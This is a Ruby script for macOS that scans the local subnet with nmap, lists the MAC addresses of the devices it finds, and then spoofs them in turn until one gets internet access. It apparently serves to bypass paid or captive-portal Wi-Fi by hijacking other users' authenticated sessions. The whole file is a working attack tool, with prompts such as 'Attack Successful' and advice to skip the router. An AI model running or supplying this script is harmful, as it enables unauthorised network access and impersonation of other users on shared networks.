require 'nmap/program'
require 'nmap/xml'
require 'open-uri'

$original_mac = nil

def restore_MAC
	puts "Press enter to restore your MAC after browsing"
	gets
	change_mac = %x(sudo ifconfig en0 ether #{$original_mac})
	puts "#{change_mac}"
	change_mac = %x(networksetup -setairportpower en0 off)
	sleep(2)
	change_mac = %x(networksetup -setairportpower en0 on)
	sleep(15)
end


def internet_connection?
  begin
    true if open("http://www.google.com/")
  rescue
    false
  end
end

def attack(mac_address_to_spoof)
	if mac_address_to_spoof.kind_of?(Array)
		#skip the first one as it's prolly the router
		count = 1
		mac_address_to_spoof.each do |address|
			puts "Trying MAC #{count}"
			change_mac = %x(sudo ifconfig en0 ether #{address})
			change_mac = %x(networksetup -setairportpower en0 off)
			sleep(2)
			change_mac = %x(networksetup -setairportpower en0 on)
			sleep(15)
			if internet_connection? 
				puts "Found a working MAC: #{address}"
				puts "Attack Successful."
				return
			else nil
			end
			count += 1
		end
		puts "Attack Failed."
	else
		change_mac = %x(sudo ifconfig en0 ether #{mac_address_to_spoof})
		change_mac = %x(networksetup -setairportpower en0 off)
		sleep(2)
		change_mac = %x(networksetup -setairportpower en0 on)
		sleep(15)
		puts "Changed the MAC to :#{change_mac}"
		puts "Activating Internet Tester"
		if internet_connection?
			puts "Attack Successful."
		else
			puts "Attack Failed."
		end
	end 
end

def parse_and_attack
	attack_list = Array.new
	Nmap::XML.new('scan.xml') do |xml|
		count = 0
		puts "Devices found"
  		puts "==================================================="
  		xml.each_host do |host|
  			if !(host.mac.nil?) and host.mac.length > 4
  				if host.vendor.nil? then 
  					puts "#{count}) Undetermined Device (MAC Address: #{host.mac})"
  				else
   	 			puts "#{count}) #{host.vendor} (MAC Address: #{host.mac})"
				end
				attack_list << host.mac
   	 		count += 1
   	 	end
  		end
  		puts "Press Enter to auto-attack based on sequence, or input the number and press enter to attack the specific device"
  		puts "Do not select any routers (usually the first one)"
  		choice = gets.chomp
		if choice.nil? or choice.empty?
			attack(attack_list)
		elsif choice.to_i <= xml.count and choice.to_i >= 0
			attack(attack_list[choice.to_i])
		else 
			attack(attack_list)
		end   
	end
end

def nmap_scan(ip_range)
	Nmap::Program.sudo_scan do |nmap|
  		nmap.xml = 'scan.xml'
  		nmap.verbose = false
  		nmap.syn_scan = true
  		nmap.service_scan = false
  		nmap.os_fingerprint = false
  		nmap.ports = [20,21,22,23,25,80,110,443,512,522,8080,1080]
  		nmap.targets = ip_range
	end
end

def mac_address
	puts 'Obtaining your current MAC Address'
  	platform = RUBY_PLATFORM.downcase
  	puts "The platform is: #{platform}"
  	curr_ip = `#{(platform =~ /win32/) ? 'ipconfig /all' : 'ifconfig'}`
  	#first: get your own IP on the network
  	case platform
    	when /darwin/
    		puts 'We\'re on MAC'
    		$original_mac = %x(ifconfig en0 |grep ether)
    		$original_mac = $original_mac[7..-1]
    		puts "your original mac is: #{$original_mac}"
    		curr_ip = curr_ip[/broadcast\s.*\n/].gsub('broadcast ', '')
    	when /win32/
    		puts 'We\'re on Windows'
    		curr_ip = curr_ip[/Physical Address\s.*\n/].gsub('Physical Address ', '')
    	#Cases for other platforms...
    	else nil
  	end
  	#then: generate mask of IP's for nmap!
  	mask = curr_ip.split('.')[3]
  	masked_ip = curr_ip.reverse.sub(mask.reverse, '*').reverse
  	nmap_scan(masked_ip)
end

mac_address
parse_and_attack
restore_MAC